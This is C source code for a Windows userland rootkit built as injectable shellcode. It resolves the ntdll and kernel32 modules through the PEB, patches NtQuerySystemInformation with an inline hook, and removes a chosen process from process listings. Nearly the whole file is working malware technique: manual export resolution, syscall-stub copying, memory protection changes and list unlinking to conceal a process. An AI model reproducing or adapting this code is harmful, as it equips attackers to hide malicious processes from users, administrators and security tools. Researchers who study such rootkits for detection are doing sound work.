#include "rootkit.h"

// mark end of shellcode
#pragma section(".text$z", read)
__declspec(allocate(".text$z")) int ShellcodeEnd = 0;

// shellcode must be located between beginning and end of shellcode sections
#pragma code_seg(".text$y")

PVOID FindExport(PBYTE ModuleBase, PCHAR TargetFunction)
{
	// parse through PE header to find target function
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)(ModuleBase + ((IMAGE_DOS_HEADER*)ModuleBase)->e_lfanew);
	PIMAGE_OPTIONAL_HEADER opHeader = &ntHeader->OptionalHeader;
	IMAGE_DATA_DIRECTORY etable = opHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	PIMAGE_EXPORT_DIRECTORY exports = (void*)(ModuleBase + etable.VirtualAddress);
	PUINT32 exportFunc = (void*)(ModuleBase + exports->AddressOfFunctions);
	PUINT32 exportName = (void*)(ModuleBase + exports->AddressOfNames);
	PUINT16 exportOrdinal = (void*)(ModuleBase + exports->AddressOfNameOrdinals);

	for (UINT16 i = 0; i < exports->NumberOfNames; i++)
	{
		if (!strcmp(TargetFunction, ModuleBase + exportName[i]))
		{
			return ModuleBase + exportFunc[exportOrdinal[i]];
		}
	}

	return NULL;
}

void HookNativeFunction(PCHAR TargetFunction, PVOID HookHandler, PVOID NativeSyscall)
{
	// parse through peb to find modules
	PPEB peb = *(PPEB*)(_readgsbase_u64() + 0x60);
	PPEB_LDR_DATA ldr = peb->Ldr;
	PLIST_ENTRY thisImage = ldr->InMemoryOrderModuleList.Flink;
	PBYTE ntdll = (PBYTE)thisImage->Flink;
	PBYTE kernel32 = (PBYTE)((PLIST_ENTRY)ntdll)->Flink;
	PVOID ntdllBase = *(PVOID*)(ntdll + (sizeof(PVOID) * 4));
	PVOID kernel32Base = *(PVOID*)(kernel32 + (sizeof(PVOID) * 4));
	DWORD oldProtect;

	PVOID targetFunctionAddr = FindExport(ntdllBase, TargetFunction);
	if (!targetFunctionAddr) return;

	BOOL(*VirtualProtect)(
		LPVOID lpAddress,
		SIZE_T dwSize,
		DWORD  flNewProtect,
		PDWORD lpflOldProtect
	) = FindExport(kernel32Base, strVirtualProtect);
	if (!VirtualProtect) return;

	BOOL (*FlushInstructionCache)(
		HANDLE  hProcess,
		LPCVOID lpBaseAddress,
		SIZE_T  dwSize
	) = FindExport(kernel32Base, strFlushInstructionCache);
	if (!FlushInstructionCache) return;
	
	// don't re-hook
	if (*(PUINT32)(SyscallStub) != *(PUINT32)(targetFunctionAddr))
	{
		return;
	}

	// get syscall prologue (includes syscall number)
	*(PUINT64)SyscallStub = *(PUINT64)targetFunctionAddr;

	// fill in syscall function (shellcode must be writable)
	// empty function has 0x10 bytes of space
	for (int i = 0; i < 0x10; i++)
		((PBYTE)NativeSyscall)[i] = ((PBYTE)SyscallStub)[i];
	
	// insert address of new function into hook
	*(PVOID*)&((PBYTE)Hook)[2] = HookHandler;

	// make targetFunction writable
	if (!VirtualProtect(targetFunctionAddr, 0x10, PAGE_EXECUTE_READWRITE, &oldProtect))
		return;

	// atomic write
	Atomic16ByteWrite(targetFunctionAddr, Hook);

	// restore original protection
	VirtualProtect(targetFunctionAddr, 0x10, oldProtect, &oldProtect);

	// flush instruction cache to ensure hook is used
	FlushInstructionCache((HANDLE)-1, targetFunctionAddr, 0x10);
}

// empty function to directly invoke syscall
__declspec(noinline) NTSTATUS SyscallNtQuerySystemInformation(
	IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
	OUT PVOID                   SystemInformation,
	IN ULONG                    SystemInformationLength,
	OUT PULONG                  ReturnLength
)
{
	return (NTSTATUS)0;
}

NTSTATUS HookedNtQuerySystemInformation(
	IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
	OUT PVOID                   SystemInformation,
	IN ULONG                    SystemInformationLength,
	OUT PULONG                  ReturnLength
)
{
	NTSTATUS ret = SyscallNtQuerySystemInformation(
		SystemInformationClass,
		SystemInformation,
		SystemInformationLength,
		ReturnLength
	);

	if (SystemInformationClass == SystemProcessInformation && NT_SUCCESS(ret))
	{
		PSYSTEM_PROCESS_INFORMATION last, info = SystemInformation;
		BOOL equal, done = FALSE;

		last = info;

		do
		{
			equal = TRUE;

			for (int i = 0; i < info->ImageName.Length / sizeof(WCHAR); i++)
			{
				if (info->ImageName.Buffer[i] != wstrBadProcessName[i])
				{
					equal = FALSE;
					break;
				}

				// verify null termination
				if (i + 1 == info->ImageName.Length && wstrBadProcessName[i + 1])
					equal = FALSE;
			}

			if (info->ImageName.Length && equal)
			{
				if (info->NextEntryOffset)
				{
					last->NextEntryOffset += info->NextEntryOffset;
				}
				else
				{
					last->NextEntryOffset = 0;
				}
			}
			else
			{
				last = info;
			}

			(PBYTE)info += info->NextEntryOffset;

		} while (last->NextEntryOffset);
	}

	return ret;
}

// EnableRootkit's address represents the beginning of shellcode
#pragma code_seg(".text$x")
void EnableRootkit()
{
	HookNativeFunction(
		strNtQuerySystemInformation,
		HookedNtQuerySystemInformation,
		SyscallNtQuerySystemInformation
	);
}